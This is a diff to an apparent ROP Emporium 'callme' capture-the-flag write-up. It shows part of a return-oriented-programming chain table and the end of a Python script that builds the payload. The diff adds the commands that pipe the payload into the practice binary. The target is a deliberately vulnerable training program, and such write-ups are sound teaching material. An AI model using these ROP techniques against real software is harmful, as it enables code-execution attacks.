@@ -198,7 +198,7 @@ In the following table, the important addresses for constructing the ROP chain a
 
 This table describes the ROP chain itself:
 
-| No | Chain link.                                                 |
+| No | Chain link                                                  |
 |----|-------------------------------------------------------------|
 | 1  | 44 garbage bytes                                            |
 | 2  | callme_one, pop3words, 0xdeadbeef, 0xcafebabe, 0xd00df00d   |
@@ -245,3 +245,12 @@ ROP_Chain += callme_three + pop3words + params
 with open("rop_chain", "wb") as f:
     f.write(ROP_Chain)
 ```
+```
+python3 chain_builder.py
+```
+```
+cat rop_chain | ./callme32
+```
+![](./16.png)
+
+Heida!!!
